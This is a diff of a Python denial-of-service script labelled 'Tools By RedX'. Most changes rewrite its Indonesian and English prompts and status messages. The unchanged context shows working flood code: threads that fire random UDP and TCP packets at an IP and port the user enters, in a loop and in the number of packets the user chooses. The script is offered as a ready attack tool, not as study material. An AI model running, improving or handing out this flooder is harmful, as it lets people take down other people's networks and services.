@@ -20,11 +20,11 @@ print('''\033[94m  Tools By RedX
           >Tools By RedX<              
 -----------------------------------------------------------
 ''')
-ip = str(input("DdosAttackByRedX | ip:"))
-port = int(input("DdosAttackByRedX | port:"))
-choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
-times = int(input("DdosAttackByRedX | Packets:"))
-threads = int(input("DdosAttackByRedX | Threads:"))
+ip = str(input("MASUKIN IPNYA WOE | ip:"))
+port = int(input("MASUKIN PORTNYA WOE | port:"))
+choice = str(input("Serang Ga Ni WOY?(y/n):"))
+times = int(input("Packetnya berapa | Packets:"))
+threads = int(input("Berapa Lama | Threads:"))
 def run():
         data = random._urandom(1024)
         i = random.choice(("[*]","[!]","[#]"))
@@ -34,9 +34,9 @@ def run():
                         addr = (str(ip),int(port))
                         for x in range(times):
                                 s.sendto(data,addr)
-                        print("\033[92m [*] RedX Menyenggol ")
+                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG ")
                 except:
-                        print("\033[94m [!] RedX IS HERE DUDE! ")
+                        print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 def run2():
         data = random._urandom(860)
         i = random.choice(("[*]","[!]","[#]"))
@@ -47,10 +47,10 @@ def run2():
                         s.send(data)
                         for x in range(times):
                              s.send(data)
-                        print("\033[92m[*] RedX Menyenggol")
+                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
                 except:
                         s.close()
-                        print("\033[93m[*] RedX In Here Dude")
+                        print("\033[93m[*TOK*TOK*] PERMISI PAKET DATENG")
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
